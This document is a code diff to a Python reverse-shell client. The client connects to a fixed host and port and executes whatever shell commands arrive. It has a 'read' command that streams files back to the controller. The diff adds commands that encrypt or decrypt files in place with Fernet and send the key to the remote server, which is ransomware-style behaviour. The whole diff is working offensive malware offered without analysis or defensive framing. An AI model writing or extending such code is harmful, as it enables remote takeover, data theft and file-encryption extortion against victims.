@@ -2,13 +2,35 @@ import socket
 import os
 import subprocess
 import sys
-import struct
+from cryptography import fernet
+from cryptography.fernet import Fernet
 
 SERVER_HOST = "10.0.1.24"
 #SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 4444
 BUFFER_SIZE = 1024
 SEPARATOR = "<sep>"
+
+key = Fernet.generate_key()
+fer = Fernet(key)
+
+def encrypt_file(file_path) :
+    with open(file_path, 'rb') as f:
+        data = f.read()
+        _data = fer.encrypt(data)
+        print(_data)
+    
+    with open(file_path, 'wb') as fp:
+        fp.write(_data)
+
+def decrypt_file(file_path) :
+    with open(file_path, 'rb') as f:
+        data = f.read()
+        _data = fer.decrypt(data)
+        print(_data)
+    
+    with open(file_path, 'wb') as fp:
+        fp.write(_data)
 
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
@@ -33,44 +55,35 @@ while True:
     elif splitted_command[0].lower() == 'read':
         file_name = splitted_command[1]
         
-        #if os.path.isfile(file_name):
-        #    # Then the file exists, and send file size
-        #    s.send(struct.pack("i", os.path.getsize(file_name)))
-        file_size = os.path.getsize(file_name)
-        s.send(str(file_size).encode())
-
-        print("Sending file...")
-        content = open(file_name, "rb")
-
-        l = content.read(BUFFER_SIZE)
-        while l :
-            s.send(l)
-            l = content.read(BUFFER_SIZE)
-        content.close()
-
-        s.recv(BUFFER_SIZE)
-
-        """
-        file_size = os.path.getsize(file_name)
-        s.send(str(file_size).encode())
-        with open(file_name, "rb") as f:
-            data = f.read()
-        s.send(data)
-        """
-        """
-        with open(file_name, "rb") as f:
-            while True:
-                # read the bytes from the file
-                data = f.read(BUFFER_SIZE)
-                if not data:
-                    # file transmitting is done
-                    break
-                # we use sendall to assure transimission in 
-                # busy networks
-                s.send(data)
+        try:
+            file_size = os.path.getsize(file_name)
         
-        """
-        output = ""
+            s.send(str(file_size).encode())
+            
+            #print("Sending file...")
+            content = open(file_name, "rb")
+
+            some_data = content.read(BUFFER_SIZE)
+            while some_data :
+                s.send(some_data)
+                some_data = content.read(BUFFER_SIZE)
+            content.close()
+
+            s.recv(BUFFER_SIZE)
+        except FileNotFoundError as e:
+            output = str(e)
+        else:
+            output = ""
+    elif splitted_command[0].lower() == "encrypt":
+        file_name = splitted_command[1]
+        encrypt_file(file_name)
+        s.send(key)
+        s.recv(BUFFER_SIZE)
+    elif splitted_command[0].lower() == "decrypt":
+        file_name = splitted_command[1]
+        decrypt_file(file_name)
+        s.send(key)
+        s.recv(BUFFER_SIZE)
     else:
         output = subprocess.getoutput(command)
     #print(s.)
